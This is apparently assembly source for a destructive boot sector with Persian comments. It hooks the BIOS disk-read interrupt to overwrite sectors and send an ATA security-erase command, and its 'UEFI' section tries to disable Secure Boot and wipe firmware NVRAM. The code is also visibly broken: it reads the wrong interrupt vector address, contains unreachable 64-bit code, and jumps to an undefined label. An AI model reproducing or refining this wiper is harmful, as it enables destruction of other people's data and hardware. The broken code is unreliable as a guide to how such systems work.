[bits 16]
[org 0x7C00]

%define UEFI_ENTRY 0x8000
%define ATA_CMD_PORT 0x1F7

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00

    ; تشخیص UEFI/BIOS
    mov eax, [es:0x40]  ; آدرس INT 13h
    cmp eax, 0
    je uefi_mode

bios_mode:
    ; نصب هندلر BIOS
    mov [old_int13], eax
    mov word [es:0x13*4], bios_int13_handler
    mov [es:0x13*4+2], cs
    jmp load_stage2

uefi_mode:
    ; جستجوی System Table
    mov eax, [es:0x40]
    test eax, eax
    jz bios_mode
    jmp UEFI_ENTRY

bios_int13_handler:
    cmp ah, 0x42
    je .extended_read
    jmp far [cs:old_int13]

.extended_read:
    pusha
    push es
    les di, [si+8]  ; ES:DI = بافر
    mov cx, [si+2]  ; تعداد سکتورها
    
    ; تخریب سکتورها با الگوی مخصوص
    mov eax, 0xDEADBEEF
    rep stosd
    
    ; تخریب سخت‌افزاری ATA
    mov dx, ATA_CMD_PORT
    mov al, 0xF4    ; SECURITY ERASE UNIT
    out dx, al
    
    pop es
    popa
    iret

load_stage2:
    ; بارگذاری مرحله دوم
    mov ah, 0x42
    mov dl, 0x80
    mov si, dap
    int 0x13
    jc error
    jmp 0x1000:0x0000

error:
    mov si, err_msg
    call print
    hlt

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print
.done:
    ret

; داده‌ها
old_int13 dd 0
err_msg db "Boot Failure!", 0

dap:
    db 0x10
    db 0
    dw 4        ; سکتورها
    dw 0        ; آفست
    dw 0x1000   ; سگمنت
    dq 1        ; LBA شروع

times 510-($-$$) db 0
dw 0xAA55

; بخش UEFI
[bits 64]
uefi_entry:
    ; دور زدن Secure Boot
    mov rax, [efi_system_table]
    mov rbx, [rax+96]    ; RuntimeServices
    mov rcx, [rbx+0x150] ; SetVariable
    
    ; غیرفعال‌کردن Secure Boot
    lea rdx, [secure_boot_var]
    xor r8, r8
    call rcx
    
    ; تخریب UEFI NVRAM
    mov rdi, 0xFFFFFFF0
    mov rcx, 0x10000
    mov rax, 0
    rep stosq
    
    ; انتقال به سیستم عامل
    jmp kernel_entry

secure_boot_var db "SecureBoot",0
efi_system_table dq 0
